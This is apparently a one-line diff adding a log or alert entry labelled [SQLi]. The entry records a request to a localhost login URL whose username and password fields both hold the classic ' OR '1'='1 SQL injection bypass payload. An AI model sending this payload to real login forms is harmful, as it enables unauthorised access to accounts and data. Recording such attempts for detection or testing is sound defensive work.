@@ -1,0 +1,1 @@
+[SQLi] 127.0.0.1 -> http://127.0.0.1/login?username='%20OR%20'1'='1&password='%20OR%20'1'='1
